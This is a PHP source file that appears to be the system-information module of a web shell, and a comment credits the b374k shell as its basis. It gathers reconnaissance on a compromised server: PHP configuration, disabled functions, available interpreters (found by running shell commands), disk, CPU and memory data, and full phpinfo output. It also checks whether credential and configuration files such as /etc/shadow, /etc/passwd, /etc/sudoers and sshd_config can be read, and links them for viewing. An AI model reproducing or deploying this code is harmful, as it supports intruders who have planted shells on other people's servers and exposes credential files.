<?php
    function getfun($n){
        return (false !== function_exists($n)) ? tText('yes', 'yes') : tText('no', 'no');
    }

    function read_file($file){
        $content = false;
        if($fh = @fopen($file, "rb")){
            $content = "";
            while(!feof($fh)){
              $content .= fread($fh, 8192);
            }
        }
        return $content;
    }

    if (isset($p['pvn'])) {
        $sBuff .= sAjax($p['pvn'] . ': ' . getfun($p['pvn']));
    }
    
    $sBuff .= '<form>' . mHide('me', 'info') . '
        <h2>' . tText('info', 'Info') . '</h2> 
        <p>' . tText('in0', 'PHP config param (ex: magic_quotes_gpc)') . '
        ' . mInput('pvn', '') . ' ' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)', '', 'style="width: 5px;display: inline;"') . '</p> 
        </form>';
    
    //resume
    $dis_func = get_cfg_var('disable_functions');
    !$dis_func && $dis_func = 'No';

    $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info');\" style='margin-bottom:8px;'>Resume</p>" .
        "<div id='info' style='margin-bottom:8px;display:none;'><table class='dataView'>";
    $info = array(
        'Server Time' => date('Y/m/d h:i:s', time()),
        'Server Domain' => $_SERVER['SERVER_NAME'],
        'Server IP' => gethostbyname($_SERVER['SERVER_NAME']),
        'Server OS' => PHP_OS,
        'Server OS Charset' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
        'Server Web Port' => $_SERVER['SERVER_PORT'],
        'PHP run mode' => php_sapi_name(),
        'This file path' => __file__,
        'PHP Version' => PHP_VERSION,
        'PHP Info' => ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<b>Yes</b>' : 'No'),
        'Safe Mode' => getcfg('safe_mode'),
        'Administrator' => (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')),
        'allow_url_fopen' => getcfg('allow_url_fopen'),
        'enable_dl' => getcfg('enable_dl'),
        'display_errors' => getcfg('display_errors'),
        'register_globals' => getcfg('register_globals'),
        'magic_quotes_gpc' => getcfg('magic_quotes_gpc'),
        'memory_limit' => getcfg('memory_limit'),
        'post_max_size' => getcfg('post_max_size'),
        'upload_max_filesize' => (getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'),
        'max_execution_time' => getcfg('max_execution_time') . ' second(s)',
        'disable_functions' => $dis_func,
        'MySQL' => getfun('mysql_connect'),
        'MSSQL' => getfun('mssql_connect'),
        'PostgreSQL' => getfun('pg_connect'),
        'Oracle' => getfun('ocilogon'),
        'Curl' => getfun('curl_version'),
        'gzcompress' => getfun('gzcompress'),
        'gzencode' => getfun('gzencode'),
        'bzcompress' => getfun('bzcompress')
    );
    
    foreach ($info as $v => $k)
        $sBuff .= "<tr><td>{$v}</td><td>{$k}</td></tr>";
    
    $sBuff .= "</table></div>";
    
    //server misc info - based on b374k
    $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
        "<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
    if ($isWIN){
        foreach (range("A", "Z") as $letter){
            if(is_readable($letter.":\\")){
                $drive = $letter.":";
                $sBuff .= "<tr><td>drive {$drive}</td><td>" . sizecount(@disk_free_space($drive)) . " free of " . sizecount(@disk_total_space($drive)) . "</td></tr>";
            }
        }
    } else 
        $sBuff .= "<tr><td>root partition</td><td>" . sizecount(@disk_free_space("/")) . " free of " . sizecount(@disk_total_space("/")) . "</td></tr>";

    $sBuff .= "<tr><td>PHP</td><td>" . phpversion() . "</td></tr>";
    $access = array(
            "python"=>"python -V",
            "perl"=>"perl -e \"print \$]\"",
            "python"=>"python -V",
            "ruby"=>"ruby -v",
            "node"=>"node -v",
            "nodejs"=>"nodejs -v",
            "gcc"=>"gcc -dumpversion",
            "java"=>"java -version",
            "javac"=>"javac -version"
        );

    foreach($access as $k => $v){
        $v = execute($v);
        if (!$v) $v = "?";

        $sBuff .= "<tr><td>{$k}</td><td>{$v}</td></tr>";
    }

    if(!$isWIN){
        $interesting = array(
            "/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
            "/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
            "/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
            "/etc/ssh/sshd_config",
            "/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
            "/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
            "/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"
        );
        foreach($interesting as $f){
            if (@is_file($f) && @is_readable($f)) 
                $sBuff .= "<tr><td>{$f}</td><td><a data-path='{$f}' onclick='view_entry(this);'>{$f} is readable</a></td></tr>";
        }
    }
    $sBuff .= "</table></div>";

    
    // cpu info
    if(!$isWIN){
        if ($i_buff=trim(read_file("/proc/cpuinfo"))){
            $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>" .
                "<div id='info_cpu' style='margin-bottom:8px;display:none;'>";
            $i_buffs = explode("\n\n", $i_buff);
            foreach($i_buffs as $i_buffss){
                $i_buffss = trim($i_buffss);
                if($i_buffss!=""){
                    $i_buffsss = explode("\n", $i_buffss);
                    $sBuff .= "<table class='dataView'>";
                    foreach($i_buffsss as $i){
                        $i = trim($i);
                        if($i!=""){
                            $ii = explode(":",$i);
                            if(count($ii)==2) $sBuff .= "<tr><td>{$ii[0]}</td><td>{$ii[1]}</td></tr>";
                        }
                    }
                    $sBuff .= "</table>";
                }
            }
            $sBuff .= "</div>";
        }

        // mem info
        if ($i_buff=trim(read_file("/proc/meminfo"))){
            $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>" .
                "<div id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>";
            $i_buffs = explode("\n", $i_buff);
            foreach($i_buffs as $i){
                $i = trim($i);
                if($i!=""){
                    $ii = explode(":", $i);
                    if(count($ii)==2) $sBuff .= "<tr><td>{$ii[0]}</td><td>{$ii[1]}</td></tr>";
                } else 
                    $sBuff .= "</table><table class='dataView'>";
            }
            $sBuff .= "</table></div>";
        }

        // partition
        if ($i_buff=trim(read_file("/proc/partitions"))){
            $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>" .
                "<div id='info_part' style='margin-bottom:8px;display:none;'>" .
                "<table class='dataView'><tr>";
            $i_buff = preg_replace("/\ +/", " ", $i_buff);
            $i_buffs = explode("\n\n", $i_buff);
            $i_head = explode(" ", $i_buffs[0]);
            foreach($i_head as $h) 
                $sBuff .= "<th>{$h}</th>";
            $sBuff .= "</tr>";
            $i_buffss = explode("\n", $i_buffs[1]);
            foreach($i_buffss as $i_b){
                $i_row = explode(" ", trim($i_b));
                $sBuff .= "<tr>";
                foreach($i_row as $r) 
                    $sBuff .= "<td style='text-align:center;'>{$r}</td>";
                $sBuff .= "</tr>";
            }
            $sBuff .= "</table></div>";
        }
    }
    
    $phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
    foreach($phpinfo as $p=>$i){
        $sBuff .= "<p class='boxtitle touch' onclick=\"toggle('{$i}');\" style='margin-bottom:8px;'>{$p}</p>";
        ob_start();
        eval("phpinfo($i);");
        $b = ob_get_contents();
        ob_end_clean();
        if (preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
            $body = str_replace(array(',', ';', '&amp;'), array(', ', '; ', '&'), $r[1]);
            $body = str_replace('<table', "<table class='boxtbl' ", $body);
            $body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
            $body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", '', $body);
            $body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", '', $body);
            $sBuff .= "<div id='{$i}' style='margin-bottom:8px;display:none;'>{$body}</div>";
        }
    }